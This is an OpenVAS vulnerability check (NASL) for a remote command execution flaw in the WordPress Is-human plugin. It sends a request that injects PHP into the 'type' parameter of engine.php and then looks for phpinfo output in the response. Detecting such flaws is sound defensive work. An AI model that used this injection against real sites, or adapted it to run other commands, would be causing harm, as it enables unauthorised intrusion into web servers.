###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_is_human_plugin_cmd_exec_vuln.nasl 11997 2018-10-20 11:59:41Z mmartin $
#
# WordPress Is-human Plugin 'passthru()' Function Remote Command Execution Vulnerability
#
# Authors:
# Veerendra GG <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802021");
  script_version("$Revision: 11997 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-05-26 10:47:46 +0200 (Thu, 26 May 2011)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("WordPress Is-human Plugin 'passthru()' Function Remote Command Execution Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/installed");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/67500");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17299");
  script_xref(name:"URL", value:"http://wordpress.org/extend/plugins/is-human");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/101497");

  script_tag(name:"impact", value:"Successful exploitation will let remote attackers to execute
  malicious commands in the context of an affected site, also remote code execution is possible.");

  script_tag(name:"affected", value:"Is-human Wordpress plugin version 1.4.2 and prior.");

  script_tag(name:"insight", value:"The flaws are caused by improper validation of user-supplied
  input to the 'passthru()' function in 'wp-content/plugins/is-human/engine.php',
  which allows attackers to execute commands in the context of an affected site.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"This host is installed with WordPress Is-human Plugin and is
  prone to remote command execution vulnerability.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:port)){
  exit(0);
}

if(dir == "/") dir = "";
url = dir + "/wp-content/plugins/is-human/engine.php?action=log-reset&type=ih_options();passthru(phpinfo());error";

req = http_get(item:url, port:port);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

if(">phpinfo()<" >< res && ">System <" >< res && ">Configuration<" >< res && ">PHP Core<" >< res){
  report = report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);